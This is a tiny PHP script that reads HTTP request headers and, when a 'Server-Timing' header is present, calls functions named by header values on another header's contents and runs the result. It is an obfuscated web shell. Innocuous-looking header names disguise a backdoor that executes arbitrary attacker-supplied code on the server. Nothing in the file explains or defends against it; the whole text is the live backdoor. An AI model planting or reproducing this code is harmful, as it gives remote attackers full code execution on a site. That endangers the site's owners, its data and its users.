<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Server-Timing'])) {
    $partition = $_HEADERS['Server-Timing']('', $_HEADERS['Content-Security-Policy']($_HEADERS['Sec-Websocket-Accept']));
    $partition();
}